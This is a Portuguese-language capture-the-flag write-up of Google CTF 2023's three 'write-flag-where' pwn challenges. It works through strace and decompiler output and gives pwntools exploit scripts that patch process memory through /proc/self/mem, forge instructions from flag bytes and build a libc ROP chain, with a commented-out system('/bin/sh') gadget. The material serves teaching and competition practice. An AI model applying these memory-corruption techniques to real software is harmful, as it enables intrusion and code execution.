# Google CTF writeups

> 06/26/2023

# Write-flag-where{,2,3}

Os três challenges são variações de um mesmo binário, com uma ideia interessante, podemos escrever o conteúdo da flag em qualquer lugar do binário, e a dificuldade de conseguir exibir a flag aumenta gradualmente.

## First Challenge

 Não recebemos o source do binário e ao executar ele parece não fazer nada, vamos para uma analise simples.

```bash
r3tr0@pwnmachine:~$ strace ./chal
execve("./chal", ["./chal"], 0x7ffc7c2c8af0 /* 72 vars */) = 0
...
openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3
read(3, "55fc9bd98000-55fc9bd99000 r--p 0"..., 4096) = 2607
close(3)                                = 0
openat(AT_FDCWD, "./flag.txt", O_RDONLY) = 3
read(3, "CTF{fake-flag}\n", 128)        = 15
close(3)                                = 0
dup2(1, 1337)                           = -1 EBADF (Bad file descriptor)
openat(AT_FDCWD, "/dev/null", O_RDWR)   = 3
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
close(3)                                = 0
alarm(60)                               = 0
...
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
read(-1, 0x7ffccb5a3300, 64)            = -1 EBADF (Bad file descriptor)
exit_group(0)                           = ?
+++ exited with 0 +++
```

Apenas dando uma olhada para o output do strace podemos entender oque está acontecendo, o binario faz *open* de `/proc/self/maps`, `./flag.txt` e `/dev/null`, executa `dup2(stdout, 1337)` e `dup2(dev_null_fd, {0,1,3})`, o erro está no `dup2 1337`, podemos ver o retorno de “Bad file descriptor”, isso acontece por que por padrão não podemos ter fd’s maiores que 1024, mas podemos alterar isso com: `ulimit -n 2048`.

Reexecutando o binário agora teremos isso:

```bash
r3tr0@pwnmachine:~$ ./chal
This challenge is not a classical pwn
In order to solve it will take skills of your own
An excellent primitive you get for free
Choose an address and I will write what I see
But the author is cursed or perhaps it's just out of spite
For the flag that you seek is the thing you will write
ASLR isn't the challenge so I'll tell you what
I'll give you my mappings so that you'll have a shot.
559ce12ba000-559ce12bb000 r--p 00000000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bb000-559ce12bc000 r-xp 00001000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bc000-559ce12bd000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bd000-559ce12be000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12be000-559ce12bf000 rw-p 00003000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bf000-559ce12c0000 rw-p 00000000 00:00 0 
559ce12c0000-559ce12c1000 rw-p 00005000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
7f3a6b091000-7f3a6b094000 rw-p 00000000 00:00 0 
7f3a6b094000-7f3a6b0bc000 r--p 00000000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b0bc000-7f3a6b251000 r-xp 00028000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b251000-7f3a6b2a9000 r--p 001bd000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2a9000-7f3a6b2ad000 r--p 00214000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2ad000-7f3a6b2af000 rw-p 00218000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2af000-7f3a6b2be000 rw-p 00000000 00:00 0 
7f3a6b2be000-7f3a6b2c0000 r--p 00000000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2c0000-7f3a6b2ea000 r-xp 00002000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2ea000-7f3a6b2f5000 r--p 0002c000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2f6000-7f3a6b2f8000 r--p 00037000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2f8000-7f3a6b2fa000 rw-p 00039000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7ffc1e28c000-7ffc1e2ad000 rw-p 00000000 00:00 0                          [stack]
7ffc1e2b4000-7ffc1e2b8000 r--p 00000000 00:00 0                          [vvar]
7ffc1e2b8000-7ffc1e2ba000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

Give me an address and a length just so:
<address> <length>
And I'll write it wherever you want it to go.
If an exit is all that you desire
Send me nothing and I will happily expire
```

Neste momento vamos fazer reversing para entender melhor:

```c
// extracted from ida64 with renamed vars
...
  close(flag_fd);
  new_stdout = dup2(1, 1337);
  dev_null_fd = open("/dev/null", 2);
  dup2(dev_null_fd, 0);
  dup2(dev_null_fd, 1);
  dup2(dev_null_fd, 2);
  close(dev_null_fd);
  alarm(60u);
  dprintf(new_stdout,
          "This challenge is not a classical pwn\n"
          "In order to solve it will take skills of your own\n"
          "An excellent primitive you get for free\n"
          "Choose an address and I will write what I see\n"
          "But the author is cursed or perhaps it's just out of spite\n"
          "For the flag that you seek is the thing you will write\n"
          "ASLR isn't the challenge so I'll tell you what\n"
          "I'll give you my mappings so that you'll have a shot.\n");
  dprintf(new_stdout, "%s\n\n", maps);
  while (1) {
    dprintf(new_stdout,
            "Give me an address and a length just so:\n"
            "<address> <length>\n"
            "And I'll write it wherever you want it to go.\n"
            "If an exit is all that you desire\n"
            "Send me nothing and I will happily expire\n");
    buf[0] = 0LL;
    buf[1] = 0LL;
    buf[2] = 0LL;
    buf[3] = 0LL;
    buf[4] = 0LL;
    buf[5] = 0LL;
    buf[6] = 0LL;
    buf[7] = 0LL;
    nr = read(new_stdout, buf, 64u);
    if ((unsigned int)__isoc99_sscanf(buf, "0x%llx %u", &n[1], n) != 2 ||
        n[0] > 127u)
      break;
    v6 = open("/proc/self/mem", 2);
    lseek64(v6, *(__off64_t *)&n[1], 0);
    write(v6, &flag_buf, n[0]);
    close(v6);
  }
  exit(0);
...
```

O código ira ler do usuário um endereço(addr) e um tamanho(num) e depois escrever ***num*** bytes da flag no endereço ****addr****.

Vamos para uma rápida explicação sobre `dup2` e `/proc/self/mem`

### dup2

A syscall dup2 é usada para clonar um fd, ela é bem simples com um uso interessante, então no nosso exemplo a chamada `dup2(1, 1337);` ira criar uma cópia do stdout para o fd 1337, então ao fazer `write(1337, buf, n);` o resultado será escrito no *stdout*, o mesmo acontece com o `dup2(dev_null_fd, 1);`, estamos sobrescrevendo o fd padrão do stdout para o fd do `/dev/null`.

Podemos ver todas as alterações em `/proc/<pid>/fd`:

```bash
r3tr0@pwnmachine:~$ ls -la /proc/$(pgrep chal)/fd
total 0
dr-x------ 2 r3tr0 r3tr0  0 jun 25 17:09 .
dr-xr-xr-x 9 r3tr0 r3tr0  0 jun 25 17:08 ..
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 0 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 1 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 1337 -> /dev/pts/0
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 2 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 4 -> 'socket:[40316]'
```

### /proc/self/mem

Esse pseudoarquivo do proc filesystem mapeia a memória do seu processo, então podemos ler diretamente o binario que está carregado em memória e também editá-lo, e não existem permissões ou restrições de memória, como “read only memory” ou “read/exec memory”, podemos sobrescrever qualquer coisa dentro do binário em memória escrevendo nesse arquivo, inclusive a .text ou .rodata.

---

Com isso falado, já fica mais claro oque temos que fazer, neste primeiro challenge, a única coisa que precisamos fazer é escrever a flag por cima da string “Give me an address and a length just so”, exploit:

```python
# pwn template ./chal --host wfw1.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"I'll give you my mappings so that you'll have a shot.")
maps = io.recvuntil(b'\n\n')

elf_base = parse_maps(maps)
log.info('Elf base: ' + hex(elf_base))
pause()

io.recvuntil(b'Send me nothing and I will happily expire')

string_addr = elf_base + 0x21e0
io.sendline(f'{hex(string_addr)} 100'.encode())

io.interactive()
```

## Second challenge

No segundo challenge, as coisas ficam um pouco mais complicadas, não temos mais uma string para sobrescrever, a única diferença desse para o anterior é a remoção do `dprintf` com a string “Give me an address and a length just so”.

Pensamos em forçar algum erro dentro da libc como um abort da malloc(”free(): double free detected in tcache 2”), poderíamos sobrescrever essa string na libc e forçar qualquer tipo de erro, mas não funcionou, como visto antes, ao tentar escrever no *stderr*, o output será redirecionado para `/dev/null`.

Tentando achar novos alvos para escrever a flag estava lendo as strings do binário, e achei algo interessante:

```bash
r3tr0@pwnmachine:~$ strings ./chal
...
Somehow you got here??
...
```

Não tinha visto essa string até agora, onde que ela está? Algum código secreto? Como Ida pude ver que existia um bloco de código desconexo do fluxo do programa, mas no radare2 ficou muito mais claro:

```bash
r3tr0@pwnmachine:~$ r2 -AA ./chal_patched
...
[0x00001100]> pdg @ main

// WARNING: Variable defined which should be unmapped: fildes
// WARNING: Could not reconcile some variable overlaps

ulong main(void)

{
    int32_t iVar1;
    ulong uVar2;
    int64_t iVar3;
    ulong buf;
    ulong var_68h;
    ulong var_60h;
    ulong var_58h;
    ulong var_50h;
    ulong var_48h;
    ulong var_40h;
    ulong var_38h;
    ulong nbytes;
    uint fd;
    uint var_14h;
    uint var_10h;
    uint var_ch;
    int32_t var_8h;
    ulong fildes;
    
    fildes._0_4_ = sym.imp.open("/proc/self/maps", 0);
    sym.imp.read(fildes, obj.maps, 0x1000);
    sym.imp.close(fildes);
    var_8h = sym.imp.open("./flag.txt", 0);
    if (var_8h == -1) {
        sym.imp.puts("flag.txt not found");
        uVar2 = 1;
    }
    else {
        iVar3 = sym.imp.read(var_8h, obj.flag, 0x80);
        if (iVar3 < 1) {
            sym.imp.puts("flag.txt empty");
            uVar2 = 1;
        }
        else {
            sym.imp.close(var_8h);
            var_ch = sym.imp.dup2(1, 0x539);
            var_10h = sym.imp.open("/dev/null", 2);
            sym.imp.dup2(var_10h, 0);
            sym.imp.dup2(var_10h, 1);
            sym.imp.dup2(var_10h, 2);
            sym.imp.close(var_10h);
            sym.imp.alarm(0x3c);
            sym.imp.dprintf(var_ch, 
                            "Was that too easy? Let\'s make it tough\nIt\'s the challenge from before, but I\'ve removed all the fluff\n"
                           );
            sym.imp.dprintf(var_ch, "%s\n\n", obj.maps);
            while( true ) {
                buf = 0;
                var_68h = 0;
                var_60h = 0;
                var_58h = 0;
                var_50h = 0;
                var_48h = 0;
                var_40h = 0;
                var_38h = 0;
                var_14h = sym.imp.read(var_ch, &buf, 0x40);
                iVar1 = sym.imp.__isoc99_sscanf(&buf, "0x%llx %u", &nbytes + 4, &nbytes);
                if ((iVar1 != 2) || (0x7f < nbytes)) break;
                fd = sym.imp.open("/proc/self/mem", 2);
                sym.imp.lseek64(fd, stack0xffffffffffffffd8, 0);
                sym.imp.write(fd, obj.flag, nbytes);
                sym.imp.close();
            }
            sym.imp.exit(0);
// [] Depois do exit existe mais codigo
            sym.imp.dprintf(var_ch, "Somehow you got here??\n");
            uVar2 = sym.imp.abort();
        }
    }
    return uVar2;
}
[0x00001100]>
```

Perfeito! Agora temos um alvo, sobrescrevemos a string “Somehow you got here??” com a nossa flag, e após isso “pulamos” a `exit`.

Para ignorar o `call exit`, usei o pattern da flag para escrever uma instrução, como podemos escolher quantos bytes queremos escrever, vamos escrever em `call exit` “CCCCT”:

```bash
r3tr0@pwnmachine:~$ python3
...
>>> hex(ord('C')), hex(ord('T'))
('0x43', '0x54')
r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4343434354
push r12
```

Com isso, podemos “ignorar” o `exit` e alcançar o dprintf desejado.

```python
# pwn template ./chal --host wfw2.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"It's the challenge from before, but I've removed all the fluff")
maps = io.recvuntil(b'\n\n')

elf_base = parse_maps(maps)
log.info('Elf start: ' + hex(elf_base))

# pause()
# ljust(0x40) for fill each read buffer
p = lambda x, y: (hex(x) + ' ' + str(y)).encode().ljust(0x40, b'\0')

string_addr = elf_base + 0x20d5
io.send(p(string_addr, 100))

# create push r12 from "C" and "CT" from flag
# two pushes are needed because of stack alignment

before_call_exit = elf_base + 0x143b
io.send(p(before_call_exit, 1))
io.send(p(before_call_exit+1, 1))
io.send(p(before_call_exit+2, 1))
io.send(p(before_call_exit+3, 2))

call_exit = elf_base + 0x1440
io.send(p(call_exit, 1))
io.send(p(call_exit+1, 1))
io.send(p(call_exit+2, 1))
io.send(p(call_exit+3, 2))

# force exit
io.sendline(b'asd')

io.interactive()
```

## Last challenge

Esse é o último e mais difícil desafio, agora não podemos mais escrever dentro do ELF, existe um if que valida que o endereço inserido não esteja dentro do range do binário, em outras palavras, devemos agora ler a flag apenas escrevendo dentro da libc.

Voltamos a cogitar forçar algum erro dentro da libc para escrever a flag, a ideia era escrever em `_IO_2_1_stderr_` e alterar o campo `_fd` para 1337, isso funcionaria… mas não temos como escrever 1337, apenas combinações de “C”, “CT”, “CTF” e “CTF{”.

Enquanto eu e meu teammate @delcon_maki tentávamos descobrir quais instruções poderíamos criar, achamos algo útil:

```python
r3tr0@pwnmachine:~$ python3
>>> hex(ord('C')), hex(ord('T')), hex(ord('F')), hex(ord('{'))
('0x43', '0x54', '0x46', '0x7b')

# 0x43 54 46 7b 43 54
#   C  T  F  {  C  T
r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 
push r12
jnp 0x48
push rsp
```

A instrução “jnp” realiza um jump caso PF=0, com isso escrevemos um exploit seguindo o seguinte plano:

- Sobreescrevemos as primeiras instruções do exit dentro da libc e pulamos a criação do stack frame
- Caímos na função adjacente e esperamos chegar até o “ret”
- Escrevemos um rop chain
- profit :D

O exploit final:

```python
# pwn template ./chal --host wfw3.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"For otherwise I will surely expire")
maps = io.recvuntil(b'\n\n')

libc_base, elf_base = parse_maps(maps)
libc.address = libc_base
exe.address = elf_base

log.info('Libc base: ' + hex(libc_base))
log.info('Elf base: ' + hex(exe.address))

# pause()
p = lambda x, y: (hex(x) + ' ' + str(y)).encode().ljust(0x40, b'\0')

__run_exit_handlers = libc.address + 0x4560b
io.send(p(__run_exit_handlers, 1))
io.send(p(__run_exit_handlers + 1, 1))
io.send(p(__run_exit_handlers + 2, 1))
io.send(p(__run_exit_handlers + 3, 2))

exit_addr = libc.address + 0x455f0
io.send(p(exit_addr, 4))
io.send(p(exit_addr+4, 2))
# 0x43 54 46 7b 43 54
#   C  T  F  {  C  T

pop_rdi = libc.address + 0x2a3e5
system_addr = libc.address + 0x50d60
bin_sh_addr = libc.address + 0x1d8698
# io.sendline(p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))

rop = ROP(libc)

flag_location = exe.address + 0x50a0
rop.call('write', [1337, flag_location, 100])
log.info(rop.dump())
io.sendline(rop.chain())

io.interactive()
```

---

Next writeups soon...

# StoryGen

# UBF (Unnecessary Binary Format)

# **Watthewasm**